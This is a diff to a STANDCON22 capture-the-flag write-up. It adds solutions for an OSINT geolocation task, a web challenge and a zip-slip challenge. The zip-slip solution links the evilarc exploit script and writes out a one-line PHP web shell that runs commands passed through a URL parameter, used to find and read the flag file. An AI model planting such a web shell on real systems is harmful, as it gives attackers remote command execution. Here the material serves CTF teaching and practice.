@@ -102,9 +102,12 @@ The thief needed to make a quick getaway, but he left his loot where he could co
 If you manage to find it, the flag is STANDCON22{text_on_box}. Replace any spaces or punctuation with an underscore "_".
 
 ### Solution
-<TOBECOMPLETED>
-![](images/Pasted%20image%2020220618132300.png)
+Using the Hint that was given for free, we can narrow down to the carpark near Vivocity
+![](images/Pasted%20image%2020220717144047.png)
 
+And viewing it in the `Satellite` view, we can see that the carpark is the correct one.
+![](images/Pasted%20image%2020220618132300.png)
+And changing the date of the Google maps, allows us to find the trolley with the words `NIPPON PAINT`
 ![](images/Pasted%20image%2020220618135917.png)
 
 ![](images/Pasted%20image%2020220618135904.png)
@@ -114,8 +117,26 @@ If you manage to find it, the flag is STANDCON22{text_on_box}. Replace any space
 STANDCON22{NIPPON_PAINT}
 ```
 
+
 # Web
 ## A Fishy Site
+
+![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
+![score](https://img.shields.io/badge/score-297-blue.svg)
+![solves](https://img.shields.io/badge/solves-19-brightgreen.svg)
+
+### Description
+
+You sail across the ocean looking for lost treasures. One night, you see lights coming out somewhere deep in the ocean. You decided to dive into the ocean towards the light....
+
+**Please do not brute force passwords. It can be guessed.**
+
+_**nc lab-2.ctf.standcon.n0h4ts.com 36021**_
+
+**The above port will spawn an instance of your challenge please do not attack it.**
+
+### Summary
+
 Starting off, the site reveals just a really simple page with an image of probably their kingdom I suppose.
 ![](images/Pasted%20image%2020220618193318.png)
 
@@ -176,26 +197,40 @@ STANDCON22{L0ST_C1TY_TR34SUR3_1S_M1N3!}
 ```
 
 ## Files can slip too
-<tobecompleted>
-zipslip (https://snyk.io/research/zip-slip-vulnerability)
-https://github.com/ptoomey3/evilarc/raw/master/evilarc.py
+
+![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
+![score](https://img.shields.io/badge/score-297-blue.svg)
+![solves](https://img.shields.io/badge/solves-19-brightgreen.svg)
+
+### Description
+Files say a lot and can do a lot, but did you knew that files can slip too? Provided the surface is slippery enough.
+
+_**nc lab-1.ctf.standcon.n0h4ts.com 47119**_
+
+**The above port will spawn an instance of your challenge please do not attack it.**
+
+### Solution
+
+Searching up on the versions being used in the application, we can see that there is a vulnerability regarding zipslip (https://snyk.io/research/zip-slip-vulnerability)
+
+And looking up on public exploits, we can find one at https://github.com/ptoomey3/evilarc/raw/master/evilarc.py
 
 ![](images/Pasted%20image%2020220619001827.png)
 
+> Note this portion below, I forgot to document down but, basically it tries to enumerate the location of the flag file. Before reading it.
+
 Simple one-liner webshell from [here](https://github.com/JohnTroony/php-webshells). Credits to [JohnTroony](https://github.com/JohnTroony).
 
-So simply, `echo "<?php echo passthru($_GET['cmd']); ?>" > kair0s3.php`
-
+So simply, `echo "<?php echo passthru($_GET['cmd']); ?>" > test.php`
+Then using the php web shell, we can run commands  below to find the flag
 `ls ../`
 `ls ../../`
 `ls ../../../`
 `cat /flag_022dc5a58d33.txt` *This is because the path of `../../../` is `/`*
-
 ### Flag
 ```
 STANDCON22{uns4f3_z!p_3xtr4c7!0n_!5_4_r34l_d4ng3r}
 ```
-
 
 # Misc
 ## Atlan Safe P1
@@ -222,6 +257,7 @@ For this challenge, we given the a `.gif` file with 2 password-protected zips.
 As such, I went straight to take look at the `image.gif` for potentially any leads to unlock those files.
 
 Taking a look at the `image.gif`, it seems to contain a series of QR codes, some of which were in different QR-code sizes.
+
 ![](images/Pasted%20image%2020220619183333.png)
 ![](images/Pasted%20image%2020220619183355.png)
 
